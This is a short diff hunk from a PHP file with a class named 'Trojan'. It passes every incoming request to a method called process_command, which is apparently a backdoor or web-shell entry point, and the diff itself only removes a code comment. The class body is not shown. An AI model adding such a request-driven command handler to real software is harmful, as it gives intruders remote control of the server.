@@ -305,4 +305,3 @@ class Trojan{
 session_start();
 $trojan = new Trojan();
 $trojan->process_command($_REQUEST);
-// I might want to move this up into one of the class methods
